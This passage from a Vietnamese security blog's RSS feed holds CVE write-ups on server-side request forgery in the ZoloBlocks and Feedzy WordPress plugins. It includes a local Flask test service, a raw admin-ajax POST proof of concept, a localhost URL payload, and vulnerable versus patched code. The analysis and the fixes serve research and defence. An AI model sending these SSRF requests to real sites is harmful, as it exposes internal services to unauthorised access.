2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;admin-ajax.php?action=zolo_demo_import&amp;#34;] --&amp;gt; B[&amp;#34;wp_ajax_nopriv_zolo_demo_import&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;demo_import()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;sanitize_text_field()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;wp_remote_get(json_file_url)&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;is_wp_error(response)?&amp;#34;}&#xA;F -- Yes --&amp;gt; G[&amp;#34;wp_send_json_error()&amp;#34;]&#xA;F -- No --&amp;gt; H[&amp;#34;json_decode(body) → extract URLs&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;wp_send_json_success()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi POST request với URL trỏ đến local service:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;action=zolo_demo_import&amp;amp;json_file_url=http://127.0.0.1:8001/metadata&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-31-cve-2025-60161/result.png&#34; title=&#34;Nội dung đọc được từ local service&#34; data-thumbnail=&#34;/posts/2025-10-31-cve-2025-60161/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Nội dung đọc được từ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-31-cve-2025-60161/result.png&#39; alt=&#34;Result&#34; height=&#34;486&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nội dung đọc được từ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-60161 là một SSRF trong &lt;code&gt;demo_import()&lt;/code&gt; của ZoloBlocks (≤ 2.3.11) do nhận URL từ người dùng và gọi &lt;code&gt;wp_remote_get()&lt;/code&gt; mà không kiểm tra. Endpoint cho phép truy cập không xác thực (&lt;code&gt;wp_ajax_nopriv_...&lt;/code&gt;). Vấn đề đã được vá trong &lt;strong&gt;2.3.12&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguyên nhân: không validate/whitelist URL trước khi &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ảnh hưởng: site chạy ZoloBlocks ≤ 2.3.11; attacker có thể truy vấn dịch vụ nội bộ (SSRF).&lt;/li&gt;&#xA;&lt;li&gt;Khắc phục nhanh: cập nhật lên &lt;strong&gt;2.3.12&lt;/strong&gt; hoặc chặn endpoint &lt;code&gt;zolo_demo_import&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Phòng ngừa: whitelist/validate URL, giới hạn egress, bảo vệ AJAX bằng nonce/quyền.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/zoloblocks/vulnerability/wordpress-zoloblocks-plugin-2-3-9-server-side-request-forgery-ssrf-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress ZoloBlocks Plugin &amp;lt;= 2.3.11 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11128 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-30-cve-2025-11128/</link>
      <pubDate>Thu, 30 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-30-cve-2025-11128/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin RSS Aggregator của Feedzy – Feed to Post, Autoblogging, News &amp;amp; YouTube Video Feeds Aggregator cho WordPress bị lỗ hổng &lt;strong&gt;Server-Side Request Forgery&lt;/strong&gt; trong tất cả các phiên bản đến và bao gồm &lt;code&gt;5.1.0&lt;/code&gt; thông qua hàm &lt;code&gt;&#39;feedzy_sanitize_feeds&#39;&lt;/code&gt;. Điều này cho phép kẻ tấn công đã xác thực, với quyền truy cập ở mức &lt;strong&gt;Subscriber&lt;/strong&gt; trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn thông tin từ các dịch vụ nội bộ.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11128&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11128&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/feedzy-rss-feeds/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Feedzy Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Feedzy&lt;/strong&gt;: &lt;strong&gt;5.1.0&lt;/strong&gt; (vulnerable) và &lt;strong&gt;5.1.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Feedzy RSS Aggregator&lt;/strong&gt; đã đăng ký một REST API endpoint tại &lt;code&gt;/feedzy/v1/feed/&lt;/code&gt;, cho phép người dùng gửi URL để lấy dữ liệu feed.&lt;br&gt;&#xA;Tuy nhiên, trong &lt;strong&gt;phiên bản 5.1.0&lt;/strong&gt;, endpoint này được bảo vệ lỏng lẻo và cơ chế lọc URL không an toàn, dẫn đến &lt;strong&gt;lỗ hổng SSRF (Server-Side Request Forgery)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function feedzy_register_rest_route() {&#xA;    register_rest_route(&#xA;        &amp;#39;feedzy/v1&amp;#39;,&#xA;        &amp;#39;/feed/&amp;#39;,&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;feedzy_rest_route&amp;#39; ),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                return is_user_logged_in();&#xA;            },&#xA;            &amp;#39;args&amp;#39;                =&amp;gt; array(&#xA;                &amp;#39;url&amp;#39;      =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_feeds&amp;#39; ),&#xA;                ),&#xA;                &amp;#39;category&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_categories&amp;#39; ),&#xA;                ),&#xA;            ),&#xA;        )&#xA;    );&#xA;}&#xA;&#xA;public function feedzy_sanitize_feeds( $input ) {&#xA;    if ( count( $input ) === 1 ) {&#xA;        $feed = esc_url( $input[0] );&#xA;        return $feed;&#xA;    } else {&#xA;        $feeds = array();&#xA;        foreach ( $input as $item ) {&#xA;            $feeds[] = esc_url( $item );&#xA;        }&#xA;        return $feeds;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Endpoint chỉ kiểm tra &lt;code&gt;is_user_logged_in()&lt;/code&gt;, tức là bất kỳ tài khoản đã đăng nhập nào (kể cả Subscriber) đều có thể gửi request.&lt;/li&gt;&#xA;&lt;li&gt;Hàm &lt;code&gt;feedzy_sanitize_feeds()&lt;/code&gt; chỉ sử dụng &lt;code&gt;esc_url()&lt;/code&gt; - hàm này chỉ làm sạch chuỗi URL để hiển thị, không xác thực tính hợp lệ hay giới hạn truy cập nội bộ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;Do đó, attacker có thể gửi payload &lt;code&gt;url=http://localhost:8001/admin&lt;/code&gt; để ép server gửi request đến dịch vụ nội bộ → SSRF.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function feedzy_register_rest_route() {&#xA;    register_rest_route(&#xA;        &amp;#39;feedzy/v1&amp;#39;,&#xA;        &amp;#39;/feed/&amp;#39;,&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;feedzy_rest_route&amp;#39; ),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( WP_REST_Request $request ) {&#xA;                $post_id = absint( $request-&amp;gt;get_param( &amp;#39;postId&amp;#39; ) );&#xA;                return current_user_can( &amp;#39;edit_post&amp;#39;, $post_id );&#xA;            },&#xA;            &amp;#39;args&amp;#39;                =&amp;gt; array(&#xA;                &amp;#39;url&amp;#39;      =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_feeds&amp;#39; ),&#xA;                ),&#xA;                &amp;#39;category&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;sanitize_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;feedzy_sanitize_categories&amp;#39; ),&#xA;                ),&#xA;            ),&#xA;        )&#xA;    );&#xA;}&#xA;&#xA;public function feedzy_sanitize_feeds( $input ) {&#xA;    if ( count( $input ) === 1 ) {&#xA;        $feed = wp_http_validate_url( $input[0] );&#xA;        return $feed;&#xA;    } else {&#xA;        $feeds = array();&#xA;        foreach ( $input as $item ) {&#xA;            if ( wp_http_validate_url( $item ) ) {&#xA;                $feeds[] = esc_url_raw( $item );&#xA;            }&#xA;        }&#xA;        return $feeds;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Giới hạn quyền truy cập REST API bằng &lt;code&gt;current_user_can( &#39;edit_post&#39;, $post_id )&lt;/code&gt;, chỉ cho phép &lt;strong&gt;Editor&lt;/strong&gt; hoặc &lt;strong&gt;Admin&lt;/strong&gt; có quyền gọi endpoint.&lt;/li&gt;&#xA;&lt;li&gt;Thay thế &lt;code&gt;esc_url()&lt;/code&gt; bằng &lt;code&gt;wp_http_validate_url()&lt;/code&gt;, đảm bảo URL hợp lệ, chỉ chấp nhận giao thức &lt;strong&gt;http&lt;/strong&gt;/&lt;strong&gt;https&lt;/strong&gt;, và loại bỏ địa chỉ nội bộ (&lt;code&gt;loopback&lt;/code&gt;, &lt;code&gt;localhost&lt;/code&gt;, &lt;code&gt;127.0.0.1...&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Sử dụng &lt;code&gt;esc_url_raw()&lt;/code&gt; để lưu URL an toàn mà không tự động mã hóa lại.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Hàm &lt;code&gt;count()&lt;/code&gt; trong &lt;code&gt;feedzy_sanitize_feeds()&lt;/code&gt; yêu cầu tham số đầu vào phải thuộc kiểu &lt;strong&gt;Countable&lt;/strong&gt; hoặc &lt;strong&gt;array&lt;/strong&gt;. Nếu truyền 